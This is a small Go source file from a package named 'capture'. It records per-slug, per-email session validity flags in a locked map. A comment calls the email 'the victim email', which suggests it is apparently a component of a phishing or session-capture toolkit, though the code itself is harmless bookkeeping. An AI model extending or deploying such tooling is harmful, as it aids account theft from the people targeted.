// capture/sessions.go   (rewritten)
package capture

import "sync"

/*  sessionValid[slug][email] = true/false  */
var sessionValid = struct {
	sync.RWMutex
	data map[string]map[string]bool
}{data: make(map[string]map[string]bool)}

/* ───────── public API ───────────────────────────────────────── */

/* MarkSessionValid(slug, email) sets the flag to true */
func MarkSessionValid(slug, email string) {
	if slug == "" || email == "" {
		return
	}
	sessionValid.Lock()
	defer sessionValid.Unlock()

	if sessionValid.data[slug] == nil {
		sessionValid.data[slug] = make(map[string]bool)
	}
	sessionValid.data[slug][email] = true
}

/* GetSessionValidFor(slug, email) returns true if that combo is marked */
func GetSessionValidFor(slug, email string) bool {
	if slug == "" || email == "" {
		return false
	}
	sessionValid.RLock()
	defer sessionValid.RUnlock()

	return sessionValid.data[slug] != nil && sessionValid.data[slug][email]
}

/* ───────── backward-compat shim ───────────────────────────────
   Old code that only had the victim email (global) will still
   compile but always returns false. Prefer the slug-aware call. */

func GetSessionValid(email string) bool {
	return false
}
